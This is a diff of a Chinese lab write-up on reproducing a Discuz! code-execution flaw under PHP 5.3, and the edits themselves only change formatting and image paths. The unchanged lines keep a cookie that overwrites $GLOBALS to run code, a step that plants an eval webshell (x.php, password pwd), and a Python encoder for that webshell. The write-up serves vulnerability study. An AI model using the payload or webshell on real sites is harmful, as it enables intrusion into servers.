@@ -2,13 +2,13 @@
 
 ## 漏洞描述
 
-由于php5.3.x版本里php.ini的设置里`request_order`默认值为GP，导致`$_REQUEST`中不再包含`$_COOKIE`，也就是说默认配置下`$_REQUEST`只包含`$_GET`和`$_POST`而不包括$_COOKIE。
+由于php5.3.x版本里php.ini的设置里`request_order`默认值为GP，导致`$_REQUEST`中不再包含`$_COOKIE`，也就是说默认配置下`$_REQUEST`只包含`$_GET`和`$_POST`而不包括$\_COOKIE。
 
 我们通过在Cookie中传入`$GLOBALS`来覆盖全局变量，造成代码执行漏洞。
 
 具体原理请参考：
 
-- https://www.secpulse.com/archives/2338.html
+* https://www.secpulse.com/archives/2338.html
 
 ## 环境搭建
 
@@ -20,7 +20,7 @@ docker-compose up -d
 
 启动后，访问`http://your-ip:8080/install/`来安装discuz，数据库地址填写`db`，数据库名为`discuz`，数据库账号密码均为`root`。
 
-![image-20220222112715390](images/202202221127521.png)
+![image-20220222112715390](../.gitbook/assets/202202221127521.png)
 
 ## 漏洞复现
 
@@ -37,7 +37,7 @@ Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies
 Connection: close
 ```
 
-![image-20220222112923996](images/202202221129105.png)
+![image-20220222112923996](../.gitbook/assets/202202221129105.png)
 
 同样方法传入以下Cookie写入一句话木马文件，文件为x.php，密码为pwd
 
@@ -74,4 +74,3 @@ print("\n\n----------WORD TO ASCII--------------------")
 words = "fputs(fopen('x.php','w'),'<?php @eval($_POST[pwd])?>');"
 word2ASCII(words)
 ```
-
